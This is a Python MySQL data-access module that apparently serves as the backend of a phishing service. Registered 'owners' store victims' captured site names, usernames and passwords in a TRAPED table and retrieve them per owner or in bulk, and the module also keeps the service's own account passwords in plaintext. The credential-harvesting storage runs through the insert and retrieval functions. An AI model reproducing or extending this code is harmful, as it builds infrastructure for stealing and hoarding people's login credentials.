import mysql.connector
from mysql.connector import pooling
import logging
import os

# Configure logging
logging.basicConfig(filename='app.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Database pool configuration
dbconfig = {
    "host": os.environ.get('DB_HOST'),
    "user": os.environ.get('DB_USER'), 
    "password": os.environ.get('DB_PASSWORD'), 
    "database": os.environ.get('DB_DATABASE'),
    "port": os.environ.get('DB_PORT'),
}

# Create a pool of connections
pool = pooling.MySQLConnectionPool(pool_name="mypool", pool_size=4, **dbconfig)

def get_connection():
    """Get a connection from the pool."""
    try:
        return pool.get_connection()
    except mysql.connector.Error as err:
        logging.error("Failed to get a connection from the pool: %s", err)
        raise

def execute_query(query, params=None, fetchall=False, commit=False):
    """
    Execute a query and handle results and exceptions.
    
    :param query: The SQL query to execute.
    :param params: Parameters to pass to the query.
    :param fetchall: If True, fetch all results; otherwise, fetch one.
    :param commit: If True, commit the transaction.
    :return: Query results if fetchall is True; else single result.
    """
    conn = None
    cursor = None
    result = None
    try:
        conn = get_connection()
        cursor = conn.cursor()
        cursor.execute(query, params or ())
        if commit:
            conn.commit()
        result = cursor.fetchall() if fetchall else cursor.fetchone()
    except mysql.connector.Error as err:
        logging.error("MySQL error occurred: %s", err)
    except Exception as e:
        logging.error("An unexpected error occurred: %s", e)
    finally:
        if cursor:
            cursor.close()
        if conn:
            conn.close()
    return result

def check_if_user_exists(uid):
    """Check if a user exists in the database."""
    logging.debug("Checking if user exists with UID: %s", uid)
    query = "SELECT 1 FROM USERS WHERE UID=%s"
    result = execute_query(query, (uid,), fetchall=True)
    logging.debug("Result: %s", result)
    return bool(result)

def insert_into_user(uid, email, pas):
    """Insert a new user into the database."""
    query = "INSERT INTO USERS (UID, EMAIL, PASSWORD) VALUES (%s, %s, %s)"
    execute_query(query, (uid, email, pas), commit=True)
    logging.info("User added: %s", uid)

def check_user_credential(uid, pas):
    """Check user credentials."""
    query = "SELECT PASSWORD FROM USERS WHERE UID=%s"
    result = execute_query(query, (uid,))
    return result and result[0] == pas

def insert_into_traped(owner, site, uid, pas):
    """Insert a trapped user record into the database."""
    query = "INSERT INTO TRAPED (OWNER, APP, UID, PASSWORD) VALUES (%s, %s, %s, %s)"
    execute_query(query, (owner, site, uid, pas), commit=True)
    logging.info("User trapped: %s", uid)

def get_traped_data_for_owner(uid):
    """Get trapped data for a specific owner."""
    detail_query = "SELECT OWNER, APP, UID, PASSWORD FROM TRAPED WHERE OWNER=%s"
    count_query = "SELECT COUNT(*) FROM TRAPED WHERE OWNER=%s"
    
    # Execute the detail query and fetch the results
    detail = execute_query(detail_query, (uid,), fetchall=True)
    
    # Execute the count query and fetch the result
    count_result = execute_query(count_query, (uid,))
    
    # Extract the count value from the result
    if count_result and isinstance(count_result, tuple):
        count = count_result[0]
    else:
        count = 0
    
    return [detail, count]


def get_traped_data():
    """Get all trapped data."""
    detail_query = "SELECT OWNER, APP, UID, PASSWORD FROM TRAPED"
    count_query = "SELECT COUNT(*) FROM TRAPED"
    detail = execute_query(detail_query, fetchall=True)
    count_result = execute_query(count_query)
    n = count_result[0][0] if count_result else 0
    return [detail, n]

def get_user_data():
    """Get all user data."""
    detail_query = "SELECT UID, EMAIL, PASSWORD FROM USERS"
    count_query = "SELECT COUNT(*) FROM USERS"
    detail = execute_query(detail_query, fetchall=True)
    count_result = execute_query(count_query)
    n = count_result[0][0] if count_result else 0
    return [detail, n]

def save_feedback(uid, name, email, msg):
    """Save user feedback."""
    create_table_query = '''CREATE TABLE IF NOT EXISTS MESSAGE
                            (UID TEXT NOT NULL,
                             NAME TEXT NOT NULL,
                             EMAIL TEXT NOT NULL,
                             MSG TEXT NOT NULL)'''
    execute_query(create_table_query, commit=True)
    insert_query = "INSERT INTO MESSAGE (UID, NAME, EMAIL, MSG) VALUES (%s, %s, %s, %s)"
    execute_query(insert_query, (uid, name, email, msg), commit=True)
    logging.info("Feedback saved: %s", uid)

def get_feedback_data():
    """Get all feedback data."""
    select_query = "SELECT UID, NAME, EMAIL, MSG FROM MESSAGE"
    detail = execute_query(select_query, fetchall=True)
    count_query = "SELECT COUNT(*) FROM MESSAGE"
    count_result = execute_query(count_query)
    n = count_result[0][0] if count_result else 0
    return [detail, n]
